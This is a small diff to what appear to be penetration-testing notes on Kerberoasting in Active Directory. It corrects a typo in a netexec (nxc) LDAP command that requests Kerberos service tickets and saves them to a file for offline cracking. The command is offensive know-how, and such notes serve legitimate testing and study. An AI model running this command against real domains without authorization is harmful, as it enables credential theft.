@@ -107,7 +107,7 @@ Kerberoasting is an attack against Active Directory where an attacker requests K
 Also can be done via tool `nxc` netexec
 
 ```bash
-nxc ldap $target -u 'username' -p 'username' --kerberoastPermisionsing output.txt
+nxc ldap $target -u 'username' -p 'username' --kerberoast output.txt
 ```
 
 *Kerberoasting via AS-REP Roasting*
